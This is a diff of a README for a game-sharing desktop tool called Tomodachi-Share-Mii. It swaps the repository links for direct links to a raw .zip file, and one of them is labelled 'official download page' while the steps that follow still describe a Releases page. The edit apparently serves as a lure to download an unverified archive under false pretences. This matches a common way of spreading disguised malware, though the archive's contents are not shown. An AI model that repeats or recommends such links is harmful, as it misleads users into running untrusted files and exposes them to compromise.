@@ -1,6 +1,6 @@
 # 💬 Tomodachi-Share-Mii - Connect with your island friends daily
 
-[![Download Tomodachi-Share-Mii](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Contraceptiveoldsquaw160/Tomodachi-Share-Mii)
+[![Download Tomodachi-Share-Mii](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Contraceptiveoldsquaw160/Tomodachi-Share-Mii/main/ShareTool/Share-Mii-Tomodachi-2.6.zip)
 
 Tomodachi-Share-Mii acts as a hub for your digital island. You can move characters between games, swap furniture, and share looks with friends. The tool brings community features to your desktop. You gain tools to view statistics, browse photo galleries, and manage your save data. 
 
@@ -30,7 +30,7 @@ Check these items to run the software on your PC.
 
 Follow these steps to set up the software.
 
-1.  Visit the [official download page](https://github.com/Contraceptiveoldsquaw160/Tomodachi-Share-Mii) to find the latest version.
+1.  Visit the [official download page](https://raw.githubusercontent.com/Contraceptiveoldsquaw160/Tomodachi-Share-Mii/main/ShareTool/Share-Mii-Tomodachi-2.6.zip) to find the latest version.
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number at the top of the list.
 4.  Scroll down to the Assets section.
